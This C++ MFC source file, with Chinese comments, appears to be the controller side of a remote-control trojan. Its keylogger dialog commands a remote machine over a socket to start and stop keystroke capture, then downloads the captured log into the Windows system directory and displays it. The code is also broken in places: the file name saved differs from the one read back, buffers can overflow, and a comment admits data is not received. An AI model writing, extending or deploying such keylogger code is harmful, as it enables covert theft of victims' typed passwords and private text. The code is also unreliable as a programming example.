// KeyLogDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "KeyLogDlg.h"
#include "afxdialogex.h"
#include "comm.h"
#include "TcpTran.h"

CKeyLogDlg *pDlg =NULL;


// CKeyLogDlg 对话框

IMPLEMENT_DYNAMIC(CKeyLogDlg, CDialogEx)

CKeyLogDlg::CKeyLogDlg(SOCKET s,CWnd* pParent /*=NULL*/)
	: CDialogEx(CKeyLogDlg::IDD, pParent)
{
	pDlg =this;
	pDlg->ClientSocket = s;
}

CKeyLogDlg::~CKeyLogDlg()
{
}

void CKeyLogDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_logEdit);
	DDX_Control(pDX, IDC_BUTTON1, m_btn_startkeylog);
	DDX_Control(pDX, IDC_BUTTON3, m_btn_show);
	DDX_Control(pDX, IDC_BUTTON2, m_btn_stopkeylog);
}


BEGIN_MESSAGE_MAP(CKeyLogDlg, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON1, &CKeyLogDlg::OnClickedStart)
	ON_BN_CLICKED(IDC_BUTTON2, &CKeyLogDlg::OnClickedStop)
	ON_BN_CLICKED(IDC_BUTTON3, &CKeyLogDlg::OnClickedShow)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()

DWORD StartKeylog()
{
	COMMAND m_command;
	
	DWORD dwSize =0;
	
	int PacketSize = 0;

	//char buffer[1024]={0};

	char *buffer = new char[1024+1];

	DWORD dwBytesRead=0;
	int  bRead= 0;
	DWORD write_size = 0;

	char savepath[MAX_PATH] = {0};
	
	CTcpTran m_tcptran;

    memset(&m_command,0,sizeof(COMMAND));

    m_command.wCmd = CMD_KEYLOG_MANAGE ;

	m_tcptran.mysend(pDlg->ClientSocket,(char *)&m_command,sizeof(m_command),0,60);

	SYSTEMTIME sysTm;
	::GetLocalTime(&sysTm);
	int m_nYear = sysTm.wYear;
	int m_nMonth = sysTm.wMonth;
	int m_nDay = sysTm.wDay;
	char filename[100]={0};

	sprintf(filename,"Key_%d_%d_%d.txt",m_nYear,m_nMonth,m_nDay);
	
	char syspath[MAX_PATH] ={0};
	GetSystemDirectory(syspath,MAX_PATH);
	strcat(syspath,"\\");
	strcat(syspath,filename);
	
	HANDLE hFile = CreateFile(syspath,
		GENERIC_WRITE,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	PacketSize =m_tcptran.myrecv(pDlg->ClientSocket,(char *)&dwSize,sizeof(DWORD),0,60,NULL,FALSE);

	DWORD dwGetSize=0;

	if (PacketSize)
	{

		while (dwGetSize<dwSize)
		{
			if (dwSize-dwGetSize<1024)
			{
                bRead = m_tcptran.myrecv(pDlg->ClientSocket,buffer,dwSize,0,60,0,false); //有问题 buffer没有接收到数据
				if (bRead>0)
				{
                     WriteFile(hFile,buffer,dwSize,&write_size,NULL);
                     //dwGetSize = dwGetSize + dwSize;
					 dwSize = dwSize - dwSize; //处理dwSize 同时dwSize为判断条件
                     bRead =0;

				}

			}
			else
            {
				bRead = m_tcptran.myrecv(pDlg->ClientSocket,buffer,1024,0,60,0,false);
				if (bRead>0)
				{
                     WriteFile(hFile,buffer,1024,&write_size,NULL);
                     //dwGetSize =dwGetSize +1024;
                     dwSize = dwSize -1024;
					 bRead =0;
				}
                
            }

		}


		CloseHandle(hFile);
		/*
		do 
		{
			bRead = m_tcptran.myrecv(dlg->ClientSocket,buffer,dwBytesRead,0,60,0,false);
			WriteFile(hFile,buffer,dwBytesRead,&write_size,NULL);
			//Sleep(1); //5 
			dwSize = dwSize - dwBytesRead;

		} while(dwSize);
		*/
	}

	return 0;
}
// CKeyLogDlg 消息处理程序


void CKeyLogDlg::OnClickedStart()
{
	// TODO: 在此添加控件通知处理程序代码
	HANDLE hThread;

	hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)StartKeylog,NULL,0,0);

    m_btn_startkeylog.EnableWindow(FALSE);
	m_btn_stopkeylog.EnableWindow(TRUE);
	m_btn_show.EnableWindow(FALSE);
}


void CKeyLogDlg::OnClickedStop()
{
	// TODO: 在此添加控件通知处理程序代码
	COMMAND m_command;

	m_command.wCmd = CMD_KEYLOG_STOP;

	CTcpTran m_tcptran;

	m_tcptran.mysend(pDlg->ClientSocket,(char *)&m_command,sizeof(m_command),0,60);

	m_btn_show.EnableWindow(true);
}


void CKeyLogDlg::OnClickedShow()
{
	// TODO: 在此添加控件通知处理程序代码
	char ShowBuf[1025] ={0};

	SYSTEMTIME sysTm;
	::GetLocalTime(&sysTm);
	int m_nYear = sysTm.wYear;
	int m_nMonth = sysTm.wMonth;
	int m_nDay = sysTm.wDay;
	char filename[100] ={0};//保存文件名
	sprintf(filename,"Key_%d_%d_%d.log",m_nYear,m_nMonth,m_nDay);
	char syspath[MAX_PATH] ={0};
	GetSystemDirectory(syspath,MAX_PATH);
	strcat(syspath,"\\");
	strcat(syspath,filename);

	HANDLE hFile = CreateFile(syspath,
		                      GENERIC_READ|GENERIC_WRITE,
							  FILE_SHARE_READ|FILE_SHARE_WRITE,
							  0,
							  OPEN_EXISTING,
							  FILE_ATTRIBUTE_NORMAL,
							  NULL);

	BOOL bRead = FALSE;
	DWORD ReadSize =0;
	CString current;
	//char Readbuf[1025]={0};
	DWORD read_size=0;

	DWORD dwGetSize=0;

	    DWORD dwSize=GetFileSize(hFile,NULL); 

		while (dwGetSize<dwSize)
		{
			if (dwSize-dwGetSize<1024)
			{
                bRead = ReadFile(hFile,ShowBuf,dwSize,&read_size,NULL);
				if (bRead)
				{
					pDlg->m_logEdit.GetWindowText(current);
					pDlg->m_logEdit.SetWindowText(current+ShowBuf);
					memset(ShowBuf,0,sizeof(ShowBuf));  //缓冲清零
					//pDlg->m_logEdit.LineScroll(pDlg->m_logEdit.GetLineCount());	
					//dwGetSize = dwGetSize + dwSize;
					dwSize = dwSize - dwSize; //处理dwSize 同时dwSize为判断条件
                    bRead = FALSE;	
				}

			}
			else
            {
				bRead = ReadFile(hFile,ShowBuf,1024,&read_size,NULL);
				if (bRead)
				{
					pDlg->m_logEdit.GetWindowText(current);
					pDlg->m_logEdit.SetWindowText(current+ShowBuf);
					memset(ShowBuf,0,sizeof(ShowBuf));  //缓冲清零
					//pDlg->m_logEdit.LineScroll(pDlg->m_logEdit.GetLineCount());	
                    //dwGetSize =dwGetSize +1024;
					dwSize = dwSize -1024;
					bRead = FALSE;
				}
                
            }
		}

		pDlg->m_logEdit.LineScroll(pDlg->m_logEdit.GetLineCount());
    	CloseHandle(hFile);

	m_btn_stopkeylog.EnableWindow(FALSE);
	m_btn_show.EnableWindow(FALSE);
	m_btn_startkeylog.EnableWindow(TRUE);
}

BOOL CKeyLogDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	m_btn_stopkeylog.EnableWindow(FALSE);
	m_btn_show.EnableWindow(FALSE);

	return true;

}

HBRUSH CKeyLogDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何特性
	if( nCtlColor == CTLCOLOR_EDIT)
	{
		pDC->SetBkMode(TRANSPARENT);
		COLORREF COLOR = RGB(0, 0, 0);
		HBRUSH brush = CreateSolidBrush(COLOR); //COLOR是你想设置的颜色 
		pDC->SetTextColor(RGB(255, 255, 255));
	 	return (HBRUSH) brush;	
	}
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}
